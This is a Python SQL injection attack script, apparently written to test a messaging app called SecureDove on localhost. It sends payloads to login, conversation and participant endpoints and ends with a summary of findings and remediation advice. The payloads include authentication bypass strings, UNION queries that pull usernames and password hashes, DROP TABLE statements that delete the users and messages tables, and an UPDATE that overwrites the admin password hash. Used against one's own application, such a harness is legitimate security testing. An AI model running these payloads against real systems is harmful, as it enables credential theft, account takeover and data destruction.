#!/usr/bin/env python3
"""
SQL Injection Attack Script for SecureDove
Educational demonstration of SQL injection vulnerabilities

This script demonstrates SQL injection vulnerabilities in:
1. Login endpoint (/api/auth/login) - protected
2. Message filtering (/api/messages/recent/all) - vulnerable to conversation ID injection
3. Conversation participants (/api/conversations/:id/participants) - vulnerable to participant data injection
"""

import requests
import sys
import time
from typing import List, Tuple, Optional

class SQLInjectionAttacker:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.auth_token: Optional[str] = None

    def authenticate(self, username: str = "testuser", password: str = "testpass123") -> bool:
        """Authenticate and get JWT token for testing authenticated endpoints"""
        endpoint = f"{self.base_url}/api/auth/login"

        payload = {
            "username": username,
            "password": password
        }

        try:
            response = self.session.post(endpoint, json=payload, timeout=10)
            if response.status_code == 200:
                data = response.json()
                self.auth_token = data.get('token')
                print(f"[+] Authenticated as {username}")
                return True
            else:
                print(f"[-] Authentication failed: {response.status_code}")
                return False
        except requests.RequestException as e:
            print(f"[-] Authentication error: {str(e)}")
            return False

    def test_sql_injection(self, username: str, password: str) -> Tuple[int, str]:
        """
        Test SQL injection payload against login endpoint

        Args:
            username: Username payload (may contain SQL injection)
            password: Password payload (may contain SQL injection)

        Returns:
            Tuple of (status_code, response_text)
        """
        endpoint = f"{self.base_url}/api/auth/login"

        payload = {
            "username": username,
            "password": password
        }

        try:
            response = self.session.post(endpoint, json=payload, timeout=10)
            return response.status_code, response.text
        except requests.RequestException as e:
            return -1, f"Request failed: {str(e)}"

    def test_message_filtering_injection(self, conversation_ids: List[str]) -> Tuple[int, str]:
        """
        Test SQL injection in message filtering endpoint
        Vulnerable to malicious conversation IDs in dynamic SQL
        """
        endpoint = f"{self.base_url}/api/messages/recent/all"

        headers = {}
        if self.auth_token:
            headers['Authorization'] = f'Bearer {self.auth_token}'

        # This endpoint likely uses conversation IDs from user's conversations
        # But we can try to manipulate by creating conversations with malicious IDs
        try:
            response = self.session.get(endpoint, headers=headers, timeout=10)
            return response.status_code, response.text
        except requests.RequestException as e:
            return -1, f"Request failed: {str(e)}"

    def test_conversation_participants_injection(self, conversation_id: str, malicious_entries: List[dict]) -> Tuple[int, str]:
        """
        Test SQL injection in conversation participants endpoint
        Vulnerable to malicious participant data
        """
        endpoint = f"{self.base_url}/api/conversations/{conversation_id}/participants"

        headers = {}
        if self.auth_token:
            headers['Authorization'] = f'Bearer {self.auth_token}'

        payload = {
            "entries": malicious_entries,
            "share_history": True
        }

        try:
            response = self.session.post(endpoint, json=payload, headers=headers, timeout=10)
            return response.status_code, response.text
        except requests.RequestException as e:
            return -1, f"Request failed: {str(e)}"

    def create_malicious_conversation(self, malicious_id: str) -> Tuple[int, str]:
        """
        Try to create a conversation with malicious ID for message filtering attack
        """
        endpoint = f"{self.base_url}/api/conversations"

        headers = {}
        if self.auth_token:
            headers['Authorization'] = f'Bearer {self.auth_token}'

        payload = {
            "conversation_entries": [
                {
                    "id": malicious_id,  # This could be the injection point
                    "username": "testuser",
                    "encrypted_content_key": "dummy_key",
                    "content_key_number": 1
                }
            ]
        }

        try:
            response = self.session.post(endpoint, json=payload, headers=headers, timeout=10)
            return response.status_code, response.text
        except requests.RequestException as e:
            return -1, f"Request failed: {str(e)}"

    def test_message_filtering_vulnerabilities(self) -> List[Tuple[str, int, str]]:
        """
        Test SQL injection vulnerabilities in message filtering
        Based on server/routes/messages.js vulnerability
        """
        results = []
        print("\n[*] Testing SQL injection in message filtering (/api/messages/recent/all)")
        print("[*] This endpoint uses dynamic SQL with conversation IDs\n")

        # First try to create conversations with malicious IDs
        malicious_ids = [
            "1) OR 1=1 --",  # Classic bypass
            "1) UNION SELECT * FROM messages --",  # Data extraction
            "1); DROP TABLE messages; --",  # Destruction
            "1) AND 1=0 UNION SELECT username, password_hash FROM users --",  # User data
        ]

        for malicious_id in malicious_ids:
            print(f"[+] Attempting to create conversation with malicious ID: {malicious_id}")
            status_code, response = self.create_malicious_conversation(malicious_id)

            if status_code == 201 or status_code == 200:
                print("    ⚠️  Conversation created - potential vulnerability!")
                print(f"    Response: {response[:200]}...")
            elif status_code == 400:
                print("    ❌ FAILED: Bad request (ID validation present)")
            elif status_code == 429:
                print("    ⏳ RATE LIMITED: Too many requests")
            else:
                print(f"    ❌ FAILED: Status {status_code} - {response[:100]}...")

            results.append((f"create_conversation_{malicious_id}", status_code, response))
            time.sleep(0.2)

        # Test the message filtering endpoint
        print("\n[+] Testing message filtering with existing conversations")
        status_code, response = self.test_message_filtering_injection([])

        if status_code == 200:
            data = response
            print("    ⚠️  Message filtering accessible - check if unauthorized data returned")
            print(f"    Response length: {len(response)} chars")
        else:
            print(f"    ❌ FAILED: Status {status_code} - {response[:100]}...")

        results.append(("message_filtering", status_code, response))
        return results

    def test_conversation_participants_vulnerabilities(self) -> List[Tuple[str, int, str]]:
        """
        Test SQL injection vulnerabilities in conversation participants
        Based on server/routes/conversations.js vulnerability
        """
        results = []
        print("\n[*] Testing SQL injection in conversation participants")
        print("[*] This endpoint processes user-supplied participant arrays\n")

        # Create a test conversation first
        print("[+] Creating test conversation for participant injection tests")
        create_status, create_response = self.create_malicious_conversation("test_conv_123")
        if create_status not in [200, 201]:
            print("[-] Could not create test conversation, skipping participant tests")
            return results

        # Extract conversation ID from response if possible
        conv_id = "test_conv_123"  # fallback

        malicious_entries = [
            {
                "username": "'; DROP TABLE users; --",
                "encrypted_content_key": "dummy",
                "content_key_number": 1
            },
            {
                "username": "' UNION SELECT username, password_hash FROM users --",
                "encrypted_content_key": "dummy",
                "content_key_number": 1
            },
            {
                "username": "admin'; UPDATE users SET password_hash='hacked' WHERE username='admin'; --",
                "encrypted_content_key": "dummy",
                "content_key_number": 1
            }
        ]

        for i, entry in enumerate(malicious_entries):
            print(f"[+] Testing malicious participant entry {i+1}: {entry['username']}")
            status_code, response = self.test_conversation_participants_injection(conv_id, [entry])

            if status_code == 200:
                print("    ⚠️  Participant added - potential SQL injection!")
                print(f"    Response: {response[:200]}...")
            elif status_code == 400:
                print("    ❌ FAILED: Bad request (input validation present)")
            elif status_code == 403:
                print("    ❌ FAILED: Forbidden (authorization check)")
            elif status_code == 429:
                print("    ⏳ RATE LIMITED: Too many requests")
            else:
                print(f"    ❌ FAILED: Status {status_code} - {response[:100]}...")

            results.append((f"participant_injection_{i+1}", status_code, response))
            time.sleep(0.2)

        return results

    def demonstrate_vulnerability(self):
        """Main demonstration of SQL injection vulnerabilities across multiple endpoints"""
        print("=" * 80)
        print("SECUREDOBE SQL INJECTION VULNERABILITY ASSESSMENT")
        print("=" * 80)
        print("Testing multiple endpoints for SQL injection vulnerabilities:")
        print("1. Login endpoint (/api/auth/login) - should be protected")
        print("2. Message filtering (/api/messages/recent/all) - potentially vulnerable")
        print("3. Conversation participants (/api/conversations/:id/participants) - potentially vulnerable")
        print()

        # Authenticate first for testing authenticated endpoints
        if not self.authenticate():
            print("[-] Could not authenticate - some tests will be limited")
            print()

        all_results = []

        # Test 1: Login endpoint (should be protected)
        print("=" * 60)
        print("PHASE 1: Testing Login Endpoint Protection")
        print("=" * 60)
        login_results = self.test_login_vulnerabilities()
        all_results.extend(login_results)

        # Test 2: Message filtering vulnerabilities
        print("\n" + "=" * 60)
        print("PHASE 2: Testing Message Filtering Vulnerabilities")
        print("=" * 60)
        message_results = self.test_message_filtering_vulnerabilities()
        all_results.extend(message_results)

        # Test 3: Conversation participants vulnerabilities
        print("\n" + "=" * 60)
        print("PHASE 3: Testing Conversation Participants Vulnerabilities")
        print("=" * 60)
        participant_results = self.test_conversation_participants_vulnerabilities()
        all_results.extend(participant_results)

        # Comprehensive Summary
        self.print_comprehensive_summary(all_results)

    def test_login_vulnerabilities(self) -> List[Tuple[str, int, str]]:
        """Test the login endpoint for SQL injection (should be protected)"""
        results = []
        print("[*] Testing SQL injection payloads against login endpoint")
        print("[*] This endpoint should be protected with input validation\n")

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT username, password FROM users --",
            "'; DROP TABLE users; --",
        ]

        for payload in payloads:
            print(f"[+] Testing login payload: {payload}")
            status_code, response = self.test_sql_injection(payload, "")

            if status_code == 200:
                print("    🚨 CRITICAL: Login bypassed - authentication compromised!")
                print(f"    Response: {response[:200]}...")
            elif status_code == 429:
                print("    ⏳ RATE LIMITED: Too many login attempts")
            elif status_code == 400:
                print("    ✅ BLOCKED: Bad request (proper validation)")
            else:
                print(f"    ❌ FAILED: Status {status_code} - {response[:100]}...")

            results.append((f"login_{payload}", status_code, response))
            time.sleep(0.2)

        return results

    def print_comprehensive_summary(self, all_results: List[Tuple[str, int, str]]):
        """Print comprehensive assessment summary"""
        print("\n" + "=" * 80)
        print("COMPREHENSIVE SQL INJECTION ASSESSMENT SUMMARY")
        print("=" * 80)

        # Categorize results
        successful_injections = []
        blocked_attempts = []
        rate_limited = []
        other_failures = []

        for test_name, status_code, response in all_results:
            if status_code == 200 and ("login" not in test_name or "bypassed" in response.lower()):
                successful_injections.append((test_name, status_code, response))
            elif status_code == 400:
                blocked_attempts.append((test_name, status_code, response))
            elif status_code == 429:
                rate_limited.append((test_name, status_code, response))
            else:
                other_failures.append((test_name, status_code, response))

        print(f"Total tests performed: {len(all_results)}")
        print(f"Successful injections: {len(successful_injections)}")
        print(f"Properly blocked: {len(blocked_attempts)}")
        print(f"Rate limited: {len(rate_limited)}")
        print(f"Other failures: {len(other_failures)}")

        if successful_injections:
            print("\n🚨 CRITICAL VULNERABILITIES FOUND!")
            print("The following tests resulted in successful SQL injection:")
            for test_name, status_code, response in successful_injections:
                print(f"  - {test_name}: Status {status_code}")
        else:
            print("\n✅ No successful SQL injections detected")

        print("\n" + "-" * 80)
        print("ENDPOINT ANALYSIS:")
        print("-" * 80)

        # Analyze by endpoint
        login_tests = [r for r in all_results if r[0].startswith("login_")]
        message_tests = [r for r in all_results if "message" in r[0] or "conversation" in r[0]]
        participant_tests = [r for r in all_results if "participant" in r[0]]

        def analyze_endpoint(name, tests):
            if not tests:
                return
            successful = [t for t in tests if t[1] == 200]
            blocked = [t for t in tests if t[1] == 400]
            print(f"{name}:")
            print(f"  - Tests: {len(tests)}")
            print(f"  - Successful injections: {len(successful)}")
            print(f"  - Properly blocked: {len(blocked)}")
            if successful:
                print("  - ⚠️  VULNERABLE TO SQL INJECTION")
            else:
                print("  - ✅ Appears secure against SQL injection")
            print()

        analyze_endpoint("Login Endpoint (/api/auth/login)", login_tests)
        analyze_endpoint("Message Filtering (/api/messages/recent/all)", message_tests)
        analyze_endpoint("Conversation Participants", participant_tests)

        print("\n" + "=" * 80)
        print("RECOMMENDATIONS")
        print("=" * 80)
        if successful_injections:
            print("🚨 IMMEDIATE ACTION REQUIRED:")
            print("- Implement proper input validation and sanitization")
            print("- Use parameterized queries for all dynamic SQL")
            print("- Implement strict allowlists for user input")
            print("- Add comprehensive SQL injection testing to CI/CD")
        else:
            print("✅ Current SQL injection protection appears adequate")
            print("- Continue monitoring for new attack vectors")
            print("- Regular security testing recommended")
            print("- Keep dependencies updated")

        print("\n[*] Note: This assessment tests known vulnerability patterns")
        print("[*] Additional zero-day vulnerabilities may exist")
        print("[*] Always use defense-in-depth security practices")

def main():
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:8000"

    print(f"[*] Targeting server: {base_url}")

    attacker = SQLInjectionAttacker(base_url)
    attacker.demonstrate_vulnerability()

if __name__ == "__main__":
    main()